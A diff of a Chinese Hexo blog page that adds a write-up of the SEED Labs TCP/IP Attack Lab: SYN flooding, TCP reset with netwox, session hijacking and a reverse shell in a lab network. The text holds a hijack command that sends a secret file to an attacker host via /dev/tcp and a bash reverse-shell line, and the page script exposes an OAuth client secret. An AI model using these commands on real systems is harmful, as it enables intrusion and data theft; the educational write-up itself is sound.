@@ -6,20 +6,54 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Tag: 网络安全 | 李小混的Blog</title>
+  <title>seedlab实验TCP/IP Attack Lab | 李小混的Blog</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="个人博客">
-<meta property="og:type" content="website">
-<meta property="og:title" content="李小混的Blog">
-<meta property="og:url" content="http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/index.html">
+  <meta name="description" content="seedlab实验TCP&#x2F;IP Attack Lab##一、实验目标 1.学习使用tcp工作原理2.学会对tcp 的主要攻击类型,如SYN 泛洪攻击、TCP 复位攻击、TCP 会话劫持攻击（代码位于底部）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="seedlab实验TCP&#x2F;IP Attack Lab">
+<meta property="og:url" content="http://example.com/post/5.html">
 <meta property="og:site_name" content="李小混的Blog">
-<meta property="og:description" content="个人博客">
+<meta property="og:description" content="seedlab实验TCP&#x2F;IP Attack Lab##一、实验目标 1.学习使用tcp工作原理2.学会对tcp 的主要攻击类型,如SYN 泛洪攻击、TCP 复位攻击、TCP 会话劫持攻击（代码位于底部）">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/TYZwkdH5oV1qe4S.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/jZTswPWJhByMEcL.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/9V3XTq2HaNsfmyv.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/2U7QbKZeIwGm4kn.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/pOEc8LeJnDklrMA.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/48IHsgdxPAelqGW.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/BdDslEQN9yS8gwt.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/3vDXjZupfarhH6E.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/Bm4KDefcMNHbnp9.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/RFUxsye6EfTqSop.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/bPvB6nyRakup74w.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/ZKzoyGtHqJsOv6I.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/lLMRxmHJ3hbU1OT.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/wbLyAlF5nIfBtCG.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/iP1pNgG29eZKWMY.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/NnyOIgPqbfu3BQJ.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/JfUFDdB8klcsia9.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/lf1PNet3bIVm65A.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/inmxFXSHjMae61k.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/71tSEmXodbaniBw.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/tJDGyKOsPi3z26F.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/OHUV4PmY9XGlJNo.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/9HUahYIf6PQmgTi.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/iTR6okLaxSmNd4t.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/ISeLl1BqP49ksQj.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/cGIC1uiszaF8Kqy.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/oNU5pnCDKlGuQiq.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/t6Y3haxkzPXNfvS.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/TsBo3Yhb4gnPueS.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/LBHJnf9eI1slSV7.png">
+<meta property="article:published_time" content="2020-12-26T06:18:06.406Z">
+<meta property="article:modified_time" content="2020-12-26T06:17:26.505Z">
 <meta property="article:author" content="李小混">
-<meta property="article:tag" content="CTF,软件安全,网络安全,IOT">
+<meta property="article:tag" content="seedlab">
+<meta property="article:tag" content="网络安全">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/12/26/TYZwkdH5oV1qe4S.png">
   
     <link rel="alternative" href="/atom.xml" title="李小混的Blog" type="application/atom+xml">
   
@@ -208,41 +242,206 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-seedlabTCPattack" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
   
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
+    <h1 class="article-title" itemprop="name">
+      seedlab实验TCP/IP Attack Lab
+    </h1>
+  
+
+
+  
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
 <a href="/post/5.html" class="archive-article-date">
         <time datetime="2020-12-26T06:18:06.406Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-26</time>
 </a>
 
+  
+  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">1.1k字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">4分</span>
+    </span>
+  </span>
+</div>
+
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="seedlab实验TCP-IP-Attack-Lab"><a href="#seedlab实验TCP-IP-Attack-Lab" class="headerlink" title="seedlab实验TCP/IP Attack Lab"></a>seedlab实验TCP/IP Attack Lab</h1><p>##一、实验目标</p>
+<p>1.学习使用tcp工作原理<br>2.学会对tcp 的主要攻击类型,如SYN 泛洪攻击、TCP 复位攻击、TCP 会话劫持攻击（代码位于底部）</p>
+<a id="more"></a>
+
+<h2 id="二、实验原理"><a href="#二、实验原理" class="headerlink" title="二、实验原理"></a>二、实验原理</h2><p>传输控制协议是因特网协议簇中的一个核心协议。它位于网络层的上一层,为运<br>行在联网的计算机中的应<br>用提供一条可靠、有序的通信信道。<br>然而,当初进行TCP设计时并没有在协议中建立安全机制,因此本质上TCP连接是<br>不受保护的,这使得攻击者<br>有可能窃听连接,向连接注入伪造信息,破坏、劫持连接等。</p>
+<h2 id="三、实验步骤及运行结果"><a href="#三、实验步骤及运行结果" class="headerlink" title="三、实验步骤及运行结果"></a>三、实验步骤及运行结果</h2><h3 id="Task1-1、SYN-泛洪攻击"><a href="#Task1-1、SYN-泛洪攻击" class="headerlink" title="Task1.1、SYN 泛洪攻击"></a>Task1.1、SYN 泛洪攻击</h3><p>首先在进行攻击之前使用Telnet 连接，之后来检测SYN 泛洪攻击是否当前的连接造成影响。</p>
+<p><img src="https://i.loli.net/2020/12/26/TYZwkdH5oV1qe4S.png"></p>
+<p>此时连接成功。</p>
+<p>观察server 中的TCP 连接状态：</p>
+<p><img src="https://i.loli.net/2020/12/26/jZTswPWJhByMEcL.png"></p>
+<p>并无半连接状态的连接。<br>之后首先关闭系统的SYN 防御机制：</p>
+<p><img src="https://i.loli.net/2020/12/26/9V3XTq2HaNsfmyv.png"></p>
+<p>然后在攻击端执行如下指令：</p>
+<p><img src="https://i.loli.net/2020/12/26/2U7QbKZeIwGm4kn.png"></p>
+<p>使用netwox 中的76 工具对10.0.2.1（server）进行，-s 意味着在ip4/ip6 对<br>数据包进行伪造，而不是链路层。<br>此时查看队列：</p>
+<p><img src="https://i.loli.net/2020/12/26/pOEc8LeJnDklrMA.png"></p>
+<p>出现了大量的半连接状态的tcp 连接。<br>但是telnet 依旧能连上，攻击失败。</p>
+<p><img src="https://i.loli.net/2020/12/26/48IHsgdxPAelqGW.png"></p>
+<p>根据实验指导手册应该是SYN cookies 防御机制的开启。<br>此时：</p>
+<p><img src="https://i.loli.net/2020/12/26/BdDslEQN9yS8gwt.png"></p>
+<p>之后关闭该机制：</p>
+<p><img src="https://i.loli.net/2020/12/26/3vDXjZupfarhH6E.png"></p>
+<p>再次进行攻击，发现此时telnet 就无法连接了。</p>
+<p>所以说：SYN cookies 防御机制并不是可以防止TCB 队列被半连接的状态填满，<br>而是哪怕被填满了，依旧可以进行tcp 的连接。</p>
+<p>###Task2．对telnet 和ssh 连接的TCP 复位攻击</p>
+<p>1、使用 netwox<br>首先建立telnet 连接，在攻击端输入：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo netwox <span class="number">78</span> -i <span class="number">10.0</span><span class="number">.2</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>
+
+<p>此时：<br>原本建立的telnet：</p>
+<p><img src="https://i.loli.net/2020/12/26/Bm4KDefcMNHbnp9.png"></p>
+<p>提示被外部主机终端。<br>之后使用：ssh 10.0.2.1 连接ssh<br>同样，在攻击端输入：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo netwox <span class="number">78</span> -i <span class="number">10.0</span><span class="number">.2</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>
+
+<p>此时原本建立的ssh 连接被中断。</p>
+<p><img src="https://i.loli.net/2020/12/26/RFUxsye6EfTqSop.png"></p>
+<p>2、使用 scapy 模块<br>首先使用wireshark 抓取最新server 向client 端的tcp 包<br>信息为：</p>
+<p><img src="https://i.loli.net/2020/12/26/bPvB6nyRakup74w.png"></p>
+<p>Dst 端口为51804，数据长度为21，序列号为4334821241，下一个序列号为：<br>433482162。<br>所以可以写如下的脚本：</p>
+<p><img src="https://i.loli.net/2020/12/26/ZKzoyGtHqJsOv6I.png"></p>
+<p>执行之后：</p>
+<p><img src="https://i.loli.net/2020/12/26/lLMRxmHJ3hbU1OT.png"></p>
+<p>之后对于ssh 连接：<br>和之前类似，只需要把端口改为22.</p>
+<p><img src="https://i.loli.net/2020/12/26/wbLyAlF5nIfBtCG.png"></p>
+<p>所以脚本为：</p>
+<p><img src="https://i.loli.net/2020/12/26/iP1pNgG29eZKWMY.png"></p>
+<p>运行之后，ssh 连接断开：</p>
+<p><img src="https://i.loli.net/2020/12/26/NnyOIgPqbfu3BQJ.png"></p>
+<h3 id="Task3-视频流应用中的TCP-恢复攻击"><a href="#Task3-视频流应用中的TCP-恢复攻击" class="headerlink" title="Task3:视频流应用中的TCP 恢复攻击"></a>Task3:视频流应用中的TCP 恢复攻击</h3><p>理论上task3 和task2 的攻击很类似，但是难题是如何找到准确的序列号。可以<br>通过嗅探来实现。<br>在client 端打开网站观看视频：</p>
+<p><img src="https://i.loli.net/2020/12/26/JfUFDdB8klcsia9.png"></p>
+<p>之后在攻击端：<br>可通过neteox 78 来实现：<br>输入：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo netwox <span class="number">78</span> -i <span class="number">10.0</span><span class="number">.2</span><span class="number">.4</span></span><br></pre></td></tr></table></figure>
+
+<p>或者编写脚本：<br>脚本如下：</p>
+<p><img src="https://i.loli.net/2020/12/26/lf1PNet3bIVm65A.png"></p>
+<p>一段时间之后：</p>
+<p><img src="https://i.loli.net/2020/12/26/inmxFXSHjMae61k.png"></p>
+<h3 id="Task4-TCP-会话劫持攻击"><a href="#Task4-TCP-会话劫持攻击" class="headerlink" title="Task4:TCP 会话劫持攻击"></a>Task4:TCP 会话劫持攻击</h3><p>由于 TCP 协议并没有对 TCP 的传输包进行身份验证，所以在我们知道一个 TCP<br>连接中的 seq 和 ack 的信息后就可以很容易的伪造传输包，假装任意一方与另<br>一方进行通信，我们将这一过程称为 TCP 会话劫持</p>
+<p>1、使用netwox<br>首先抓取最新的client 发向server 的数据包：</p>
+<p><img src="https://i.loli.net/2020/12/26/71tSEmXodbaniBw.png"></p>
+<p>可以获得源端口，目的端口，序列号，确认号<br>首先在攻击端输入</p>
+<p><img src="https://i.loli.net/2020/12/26/tJDGyKOsPi3z26F.png"></p>
+<p>打开端口，之后用netwox – 40 工具包伪造数据包：<br>因为要发送的指令为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\r cat /home/seed/Desktop/secret &gt; /dev/tcp/<span class="number">10.0</span><span class="number">.2</span><span class="number">.11</span>/<span class="number">9090</span>\r</span><br></pre></td></tr></table></figure>
+
+<p>先将上述指令转化为16 进制：</p>
+<p><img src="https://i.loli.net/2020/12/26/OHUV4PmY9XGlJNo.png"></p>
+<p>之后使用如下指令：</p>
+<p><img src="https://i.loli.net/2020/12/26/9HUahYIf6PQmgTi.png"></p>
+<p>伪造数据包，发送之后，攻击方显示：</p>
+<p><img src="https://i.loli.net/2020/12/26/iTR6okLaxSmNd4t.png"></p>
+<p>成功打印secret。</p>
+<p>之后也可以使用python 代码实现攻击：</p>
+<p>可以根据获得的数据编写代码：</p>
+<p><img src="https://i.loli.net/2020/12/26/ISeLl1BqP49ksQj.png"></p>
+<p>最新的包如上，编写脚本如下：</p>
+<p><img src="https://i.loli.net/2020/12/26/cGIC1uiszaF8Kqy.png"></p>
+<p>运行之后，结果如下：</p>
+<p><img src="https://i.loli.net/2020/12/26/oNU5pnCDKlGuQiq.png"></p>
+<p>打印成功。</p>
+<h3 id="Task5-使用TCP-会话劫持创建反向Shell"><a href="#Task5-使用TCP-会话劫持创建反向Shell" class="headerlink" title="Task5:使用TCP 会话劫持创建反向Shell"></a>Task5:使用TCP 会话劫持创建反向Shell</h3><p>这一个实验需要server 执行：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt; /dev/tcp/<span class="number">10.0</span><span class="number">.2</span><span class="number">.11</span>/<span class="number">9090</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> <span class="number">0</span>&lt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>抓取最新的包：</p>
+<p><img src="https://i.loli.net/2020/12/26/t6Y3haxkzPXNfvS.png"></p>
+<p>可编写脚本如下：</p>
+<p><img src="https://i.loli.net/2020/12/26/TsBo3Yhb4gnPueS.png"></p>
+<p>最后，建立shell 连接：</p>
+<p><img src="https://i.loli.net/2020/12/26/LBHJnf9eI1slSV7.png"></p>
+<p>攻击成功。</p>
+
+    
+
+    
+    <div class="page-reward">
+      <a href="javascript:void(0);" class="page-reward-btn tooltip-top" target="_self">
+        <div class="tooltip tooltip-east">
+          <span class="tooltip-item">
+            赏
+          </span>
+          <span class="tooltip-content">
+            <span class="tooltip-text">
+              <span class="tooltip-inner">
+                <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i
+                    class="icon icon-quo-right"></i></p>
+                <div class="reward-box">
+                  
+                  
+                  <div class="reward-box-item">
+                    <img class="reward-img" src="https://i.loli.net/2020/12/22/Vn4iaZwcXKJA2pM.png">
+                    <span class="reward-type">微信</span>
+                  </div>
+                  
+                </div>
+              </span>
+            </span>
+          </span>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/post/5.html">seedlab实验TCP/IP Attack Lab</a>
-	
-    </h1>
-  
+      </a>
+    </div>
+    
 
-
-        <div class="article-info info-on-right">
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          李小混
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="https://lixiaohun.github.io/post/5.html" title="seedlab实验TCP/IP Attack Lab" target="_blank">https://lixiaohun.github.io/post/5.html</a>
+        </li>
+        
+        <li>
+          <strong>版权声明： </strong>
           
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
+        
+      </ul>
+    </div>
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -258,113 +457,143 @@
 		</ul>
 	</div>
 
-          
+    
 
+    
+
+    
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/post/5.html" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+
+    
+    <div class="clearfix"></div>
+  </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/post/4.html" class="archive-article-date">
-        <time datetime="2020-12-26T05:07:35.669Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-26</time>
-</a>
 
+
+<nav id="article-nav">
+  
+  
+    <a href="/post/4.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">seedlab实验ARP缓存中毒攻击</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/post/4.html">seedlab实验ARP缓存中毒攻击</a>
-	
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">seedlab</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">网络安全</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#seedlab%E5%AE%9E%E9%AA%8CTCP-IP-Attack-Lab"><span class="toc-number">1.</span> <span class="toc-text">seedlab实验TCP&#x2F;IP Attack Lab</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">二、实验原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4%E5%8F%8A%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C"><span class="toc-number">1.2.</span> <span class="toc-text">三、实验步骤及运行结果</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Task1-1%E3%80%81SYN-%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.1.</span> <span class="toc-text">Task1.1、SYN 泛洪攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task3-%E8%A7%86%E9%A2%91%E6%B5%81%E5%BA%94%E7%94%A8%E4%B8%AD%E7%9A%84TCP-%E6%81%A2%E5%A4%8D%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.2.</span> <span class="toc-text">Task3:视频流应用中的TCP 恢复攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task4-TCP-%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.3.</span> <span class="toc-text">Task4:TCP 会话劫持攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task5-%E4%BD%BF%E7%94%A8TCP-%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81%E5%88%9B%E5%BB%BA%E5%8F%8D%E5%90%91Shell"><span class="toc-number">1.2.4.</span> <span class="toc-text">Task5:使用TCP 会话劫持创建反向Shell</span></a></li></ol></li></ol></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/post/3.html" class="archive-article-date">
-        <time datetime="2020-12-26T04:20:07.705Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-26</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/post/3.html">seedlab实验Sniffing_Spoofing</a>
-	
-    </h1>
-  
+        
+    </div>
+</aside>
 
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">seedlab</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">网络安全</a>
-        		</li>
-      		
-		</ul>
-	</div>
 
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+
+
+
+
+
+
+
   
+  <div id="gitment-ctn"></div>
   
-    </div></section>
+    <!-- 中文 -->
+    <link rel="stylesheet" href="/lib/gitment.css">
+    <script src="/lib/gitment.js"></script>
+  
+  <script>
+    <!-- id: "seedlab实验TCP/IP Attack Lab" -->
+    var gitment = new Gitment({
+      id: "20201226141806",
+      owner: 'lixiaohun',
+      repo: 'lixiaohun.github.io',
+      oauth: {
+        client_id: 'fbdd08a6d090f32c952e',
+        client_secret: 'be3e36e2c6d45c43ff218c12df2dfa123eb1e40d',
+      },
+    })
+    gitment.render('gitment-ctn')
+  </script>
+
+
   
 
-    
 
 
           </div>
@@ -402,9 +631,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
